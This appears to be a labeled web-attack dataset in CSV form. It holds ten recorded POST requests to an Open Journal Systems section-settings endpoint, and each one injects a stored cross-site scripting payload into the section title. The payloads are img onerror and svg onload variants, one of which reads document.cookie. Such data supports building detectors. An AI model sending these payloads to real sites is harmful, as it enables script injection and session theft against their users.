request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
65db9d9df81be934a17cd39c0d4e2832,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3CSVG+ONLOAD%3Dalert(1)%3E&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,388,172.19.2.40,36296,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
cf714bb6c7f552694d242c689da59f06,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3dx%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,401,172.19.2.40,36298,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
e480e77be41e266279752593327dc0a8,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3dx%20onerror%3dalert(document%2ecookie)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,417,172.19.2.40,36308,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d376ec18b04bb3829a8cf1145cde16af,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3dx%20onerror%3dconfirm(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36310,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
0ff73b18cde6660f47ef5c1d4481b5b6,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3d%22%22%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,406,172.19.2.40,36320,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
ea014b308cb1f059c960225130690e5d,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3dx%20onerror%3dprompt(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,402,172.19.2.40,36322,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
b4f61370b46a9313b2aca5565b8ba4fe,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cIMG%20SRC%3dx%20ONERROR%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,401,172.19.2.40,36358,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
dccfd36a9efb0c6b3699fd2bffeaafd6,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%20src%3d%23%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,403,172.19.2.40,36350,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
8d89c23e70ecc75ac4e6645a9dbe2fea,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3cimg%2fsrc%3dx%20onerror%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,401,172.19.2.40,36336,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
16be2e907055a517f741cc7cb7ec655f,"Fri, 12 Jun 2026 07:50:13 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=3,sectionId=3,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/management/settings/context,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&sectionId=3&title%5Ben_US%5D=%3csvg%20onload%3dalert(1)%3e&title%5Bfr_CA%5D=aa&abbrev%5Ben_US%5D=ART&abbrev%5Bfr_CA%5D=&policy%5Ben_US%5D=%3Cp%3E1234%3C%2Fp%3E%0D%0A%3Cp%3E%26nbsp%3B%3C%2Fp%3E&policy%5Bfr_CA%5D=%3Cp%3Eqq%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&identifyType%5Bfr_CA%5D=&subEditors%5B%5D=6&subEditors%5B%5D=4&submitFormButton=,390,172.19.2.40,36364,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/management/settings/context"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
